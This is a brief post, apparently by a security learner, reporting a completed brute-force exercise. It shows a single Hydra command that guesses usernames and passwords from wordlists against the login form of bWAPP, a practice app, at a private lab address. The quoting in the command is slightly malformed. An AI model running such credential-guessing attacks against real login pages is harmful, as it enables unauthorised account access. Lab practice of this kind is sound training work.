I have completed a project in bruteforce attack using hydra tool
that commands:
     hydra 172.16.58.133 http-form-post“/bwapp/login.php:login=^USER^&password=^PASS^&form=submit:Invalid Credentials or user not activated -L user.txt -P pass.txt
     
